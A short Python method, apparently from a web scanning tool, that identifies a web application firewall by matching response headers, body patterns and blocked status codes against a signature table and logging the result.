    def fingerprint_waf(
        self,
        headers: dict[str, str] | None = None,
        body: str = "",
        status_code: int = 200,
    ) -> str | None:
        """Detect WAF from HTTP response.  Returns WAF name or None."""
        if not headers and not body:
            return None
        hdrs_lower = {k.lower(): v.lower() for k, v in (headers or {}).items()}
        for waf_name, sig in WAF_SIGNATURES.items():
            for hdr_key, hdr_val in sig.get("headers", {}).items():
                actual = hdrs_lower.get(hdr_key, "")
                if actual and (not hdr_val or hdr_val in actual):
                    logger.info(f"🛡️  WAF detected: {waf_name} (header: {hdr_key})")
                    return waf_name
            for pattern in sig.get("body_patterns", []):
                if re.search(pattern, body, re.IGNORECASE):
                    logger.info(f"🛡️  WAF detected: {waf_name} (body pattern)")
                    return waf_name
            if status_code in sig.get("blocked_codes", set()):
                for hdr_key in sig.get("headers", {}):
                    if hdr_key in hdrs_lower:
                        return waf_name
        return None

